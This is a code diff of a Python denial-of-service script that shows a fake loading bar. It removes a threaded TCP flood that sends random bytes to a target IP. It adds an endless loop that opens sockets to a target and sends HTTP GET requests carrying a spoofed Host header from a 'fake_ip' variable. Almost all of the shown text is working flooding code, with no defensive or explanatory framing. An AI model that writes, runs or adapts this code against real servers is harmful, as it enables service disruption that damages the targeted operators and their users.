@@ -49,24 +49,17 @@ print("[===============     ] 75%")
 time.sleep(2)
 print("[====================] 100%")
 time.sleep(1)
-def start():
-    hh = random._urandom(10)
-    xx = int(0)
-    while True:
-        try:
-            s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip,port))
-            s.send(hh)
-            for i in range(pack):
-                s.send(hh)
-            xx += 1
-            print("Attacking "+ip+" | sent: "+str(xx))
-        except:
-            s.close()
-            print("Packet sent")
-            time.sleep(1)
+attack_num = 0
 
-for x in range(thread):
-    thread = threading.Thread(target=start)
-    thread.start()
-   
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
